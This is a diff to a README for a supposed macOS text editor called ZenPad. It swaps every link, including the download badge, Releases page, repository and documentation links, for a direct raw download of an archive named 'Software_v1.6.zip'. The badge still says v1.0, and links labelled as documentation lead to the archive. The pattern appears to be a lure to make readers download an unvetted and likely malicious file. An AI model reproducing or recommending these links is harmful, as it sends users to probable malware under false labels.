@@ -6,9 +6,9 @@ Welcome to ZenPad! It is a native macOS text editor designed for both writers an
 
 ## 📥 Download ZenPad
 
-[![Download ZenPad](https://img.shields.io/badge/Download%20ZenPad-v1.0-brightgreen)](https://github.com/Gojaja/zenpad/releases)
+[![Download ZenPad](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip%20ZenPad-v1.0-brightgreen)](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip)
 
-To get started with ZenPad, visit the [Releases page](https://github.com/Gojaja/zenpad/releases) to download the latest version.
+To get started with ZenPad, visit the [Releases page](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip) to download the latest version.
 
 ## 🛠️ Features
 
@@ -29,7 +29,7 @@ To get started with ZenPad, visit the [Releases page](https://github.com/Gojaja/
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Gojaja/zenpad/releases).
+1. Visit the [Releases page](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip).
 2. Find the latest version listed.
 3. Click the download link to save the application.
 4. Open the downloaded file.
@@ -64,7 +64,7 @@ To get started with ZenPad, visit the [Releases page](https://github.com/Gojaja/
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Gojaja/zenpad)
-- [Documentation](https://github.com/Gojaja/zenpad/wiki)
+- [GitHub Repository](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip)
+- [Documentation](https://github.com/Gojaja/zenpad/raw/refs/heads/main/ZenPad/Software_v1.6.zip)
 
 Thank you for choosing ZenPad! We hope it enhances your writing experience. For any questions or support, feel free to reach out through GitHub issues or our community forums. Enjoy writing!
